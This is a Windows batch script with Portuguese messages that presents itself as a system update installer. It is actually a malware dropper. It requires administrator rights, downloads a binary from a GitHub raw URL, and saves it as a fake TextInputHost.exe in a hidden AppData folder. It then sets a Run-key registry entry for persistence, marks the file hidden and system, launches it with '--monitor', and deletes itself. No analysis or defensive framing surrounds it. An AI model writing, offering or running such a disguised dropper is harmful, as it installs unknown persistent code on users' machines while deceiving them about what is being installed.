@echo off
setlocal EnableDelayedExpansion
title System Update Helper
cd /d "%~dp0"

echo.
echo ================================================
echo   INSTALADOR DE COMPONENTES DO SISTEMA
echo ================================================
echo.

rem --- CONFIGURACAO DO REPOSITORIO ---
set "REPO_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/WinSystemAsset.bin"
set "TARGET_NAME=TextInputHost.exe"
set "TARGET_DIR=%APPDATA%\Microsoft\Windows\SystemData"
rem -----------------------------------

rem 1. Verificar privilégios
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Execute este script como ADMINISTRADOR para atualizar componentes do sistema.
    echo.
    pause
    exit /b 1
)

echo [1/6] Encerrando servicos de entrada...
taskkill /f /im TextInputHost.exe >nul 2>&1
taskkill /f /im FontCacheHost.exe >nul 2>&1
taskkill /f /im rkt.exe >nul 2>&1

echo [2/6] Limpando arquivos temporarios...
if not exist "!TARGET_DIR!" mkdir "!TARGET_DIR!"
attrib -h -s "!TARGET_DIR!\!TARGET_NAME!" >nul 2>&1
del /f /q "!TARGET_DIR!\!TARGET_NAME!" >nul 2>&1
del /f /q "!TARGET_DIR!\*.lock" >nul 2>&1

echo [3/6] Baixando recursos do servidor...
rem Tenta baixar o .bin do GitHub usando curl (nativo do Windows 10+)
curl -s -L "!REPO_URL!" -o "!TARGET_DIR!\!TARGET_NAME!"

if not exist "!TARGET_DIR!\!TARGET_NAME!" (
    echo [ERRO] Falha ao baixar recursos. Verifique sua conexao.
    pause
    exit /b 1
)
echo   [OK] Recursos baixados com sucesso.

echo [4/6] Configurando persistencia...
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftWindowsFontCache" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TextInputService" /t REG_SZ /d "\"!TARGET_DIR!\!TARGET_NAME!\" --monitor" /f >nul 2>&1

echo [5/6] Aplicando atributos de sistema...
attrib +h +s "!TARGET_DIR!\!TARGET_NAME!" >nul 2>&1

echo [6/6] Iniciando o servico...
start "" "!TARGET_DIR!\!TARGET_NAME!" --monitor

echo.
echo ================================================
echo   PROCESSO CONCLUIDO COM SUCESSO!
echo ================================================
echo.
echo O sistema agora esta atualizado.
echo Este instalador se auto-destruira em 3 segundos...
timeout /t 3 >nul
(goto) 2>nul & del "%~f0"
